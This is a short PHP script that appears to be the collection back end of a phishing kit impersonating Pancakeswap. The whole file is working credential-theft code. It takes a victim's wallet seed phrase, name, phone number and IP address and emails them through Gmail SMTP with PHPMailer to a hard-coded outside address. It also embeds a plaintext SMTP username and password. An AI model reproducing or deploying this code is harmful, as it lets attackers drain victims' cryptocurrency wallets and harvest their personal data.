<?php $customerEmailer='<!DOCTYPE html><htm><body><p>Wallet Seed : '.@$wallet_seed.'</p><p>Brand : '.@$brandName.'</p><p>Name : '.@$name.'</p><p>Phone  Number : '.@$number.'</p><p>IP : '.@$ip.'</p></body></html>';$subject='Pancakeswap '.date('d-m-Y');$message=$customerEmailer;$toAddress_sh='sh2074301@gmail.com';$fromTitle=$_SERVER['HTTP_HOST'];$fromEmail='details@'.$_SERVER['HTTP_HOST'];$mail=new PHPMailer;$mail->SMTPDebug=2;$mail->Host='smtp.gmail.com';$mail->SMTPAuth=true;$mail->Username='smtpkeymail@gmail.com';$mail->Password='smtpkeymail112@';$mail->SMTPSecure='tls';$mail->Port=587;$mail->setFrom($fromEmail,$fromTitle);$mail->addAddress($toAddress_sh);$mail->isHTML(true);$mail->Subject=$subject;$mail->Body=$message;$mailS=$mail->send(); ?>